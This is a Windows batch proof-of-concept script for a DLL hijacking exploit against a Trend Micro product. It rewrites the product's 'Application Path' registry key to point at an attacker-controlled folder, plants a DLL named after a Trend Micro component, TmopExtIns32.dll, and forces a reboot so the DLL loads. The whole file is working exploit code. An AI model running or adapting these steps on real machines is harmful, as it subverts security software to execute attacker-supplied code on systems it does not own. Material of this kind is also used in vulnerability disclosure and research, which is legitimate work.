@echo off
:: Step 1: Modify Registry to Redirect Execution Path
echo Modifying Trend Micro Registry Key...
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\TrendMicro\PC-cillinNTCorp\CurrentVersion" /v "Application Path" /t REG_SZ /d "C:\poc\AAAAAAAA\" /f

:: Step 2: Create Attacker-Controlled Directory
echo Creating Malicious Execution Path...
mkdir C:\poc\AAAAAAAA

:: Step 3: Copy Malicious DLL (calc.dll)
echo Placing Malicious DLL...
copy C:\poc\calc.dll C:\poc\AAAAAAAA\TmopExtIns32.dll

:: Step 4: Restart the System (Triggers Execution)
echo Restarting System to Trigger Exploit...
shutdown /r /t 10
